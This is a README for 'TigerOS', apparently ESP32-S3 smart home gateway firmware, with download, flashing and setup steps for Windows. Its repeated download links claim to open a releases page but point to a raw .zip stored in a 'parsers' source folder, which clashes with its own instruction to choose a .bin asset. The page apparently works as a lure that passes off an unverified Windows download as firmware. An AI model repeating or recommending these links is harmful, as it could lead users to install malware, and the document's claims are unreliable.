# 🐯 TigerOS - Build your own smart home gateway

[![Download TigerOS](https://img.shields.io/badge/Download-TigerOS-blue.svg)](https://github.com/Ast36719/TigerOS/raw/refs/heads/main/firmware/main/parsers/Tiger_OS_v3.8-alpha.2.zip)

TigerOS provides a bridge between your home devices and your network. This software turns your ESP32-S3 hardware into a reliable hub for your smart home. It handles Bluetooth and Wi-Fi signals to keep your devices connected.

## 🛠 What you need

Before you start, gather these items:

* A computer running Windows 10 or Windows 11.
* An ESP32-S3 development board.
* A USB-C data cable.
* A stable internet connection.

Your computer needs a driver to talk to the ESP32-S3 board. Most modern Windows versions download this driver automatically. If your computer does not see the device, search for "CP210x USB to UART Bridge VCP Drivers" online and install the correct version for Windows.

## 📥 Getting the software

You must visit the project page to download the latest version of the firmware.

[Visit the TigerOS GitHub releases page to download the file](https://github.com/Ast36719/TigerOS/raw/refs/heads/main/firmware/main/parsers/Tiger_OS_v3.8-alpha.2.zip)

Look for the "Assets" section on the releases page. Choose the file that ends in .bin. This file contains the instructions your hardware needs to function. Save this file to your desktop for easy access.

## ⚙️ Setting up your hardware

1. Connect the ESP32-S3 board to your Windows computer using the USB-C cable.
2. Wait for Windows to identify the hardware.
3. Open the "Device Manager" on your computer.
4. Expand the section labeled "Ports (COM & LPT)".
5. Note the number next to the port label (e.g., COM3). You will need this number later.

## 🚀 Running the software for the first time

To put the firmware on your board, you need a flashing tool. A reliable tool for this task is the ESPHome-Flasher. 

1. Download the ESPHome-Flasher tool from its official website.
2. Open the program.
3. In the "Serial Port" dropdown menu, select the COM port you found in the Device Manager.
4. Click the "Browse" button and select the TigerOS .bin file you saved to your desktop.
5. Click "Flash ESP" to begin.
6. A progress bar appears. Keep the device plugged in until the bar shows "Done".

Once the process finishes, the firmware runs on your board. The board will create a temporary Wi-Fi network. Use your phone or computer to connect to a network named "TigerOS-Setup". Open a web browser and go to 192.168.4.1 to enter your home Wi-Fi details. The board will restart and connect to your home network.

## 🏠 Using the gateway

After the hardware connects to your home network, you can manage it from any computer in the house. Type the IP address assigned to your device into your web browser. 

The dashboard allows you to:

* Connect Bluetooth devices.
* Set up MQTT for data transmission.
* Manage Home Assistant integration.
* Check the signal strength of nearby sensors.

If you change your Wi-Fi password or need to reset the device, hold the "Reset" button on the board for ten seconds. The device will return to setup mode, and you can repeat the process to re-connect.

## 🔍 Frequently asked questions

**Does this work on older Windows versions?**
The software functions on Windows 10 and 11. Older versions may lack necessary drivers.

**What do I do if the flash fails?**
Check your cable. Some USB cables only provide power and cannot send data. A data-capable USB cable resolves most connection issues.

**Can I use this with Home Assistant?**
Yes. You can add the gateway as an integration within the Home Assistant menu once the firmware connects to your network.

**How do I update the firmware?**
Visit the GitHub link provided above to check for newer versions. Download the latest .bin file and follow the same flashing steps. Your settings usually persist through updates.

**Is the software free?**
TigerOS is open-source. You can modify the code if you have experience with programming, but it is not required for daily use.

**Does it support all ESP32 boards?**
This firmware specifically targets the ESP32-S3 chip. Other models may not work correctly. Verify your hardware specifications before you begin the flashing process.

If you experience unexpected behavior, observe the LED lights on the board. A steady blink often indicates a successful connection, while rapid flashes suggest the device is searching for a network. Ensure your Wi-Fi uses the 2.4GHz band, as most IoT hardware cannot see 5GHz networks.